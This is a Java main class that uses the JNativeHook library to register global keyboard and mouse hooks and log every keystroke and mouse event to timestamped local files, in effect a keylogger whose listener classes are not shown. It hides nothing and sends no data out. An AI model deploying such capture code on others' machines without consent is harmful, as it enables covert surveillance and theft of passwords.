import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;

import java.io.FileNotFoundException;
import java.io.PrintWriter;
import java.text.SimpleDateFormat;
import java.util.Date;

public class Main {

    public static void main(String[] args) {
        Date date = new Date();
        String keyFileName = "logs\\" + "KeyLog" + new SimpleDateFormat("MM_dd_yyyy_hh-mm-ss").format(date)+".txt";
        String mouseFileName = "logs\\" + "MouseLog" + new SimpleDateFormat("MM_dd_yyyy_hh-mm-ss").format(date)+".txt";

        PrintWriter keyFile;
        PrintWriter mouseFile;
        try {

            keyFile = new PrintWriter(keyFileName);
            mouseFile = new PrintWriter(mouseFileName);

            GlobalScreen.registerNativeHook();

            GlobalScreen.addNativeKeyListener(new KeyboardListener(keyFile));

            // Construct the example object.
            MouseListener example = new MouseListener(mouseFile);

            // Add the appropriate listeners.
            GlobalScreen.addNativeMouseListener(example);
            GlobalScreen.addNativeMouseMotionListener(example);
            while (GlobalScreen.isNativeHookRegistered()){

            }
            keyFile.flush();
            mouseFile.flush();
            keyFile.close();
            mouseFile.close();
            System.out.println("closed files");
        } catch (FileNotFoundException e) {
            e.printStackTrace();
        } catch (NativeHookException e) {
            System.err.println("There was a problem registering the native hook.");
            System.err.println(e.getMessage());
            System.exit(1);
        }


    }

}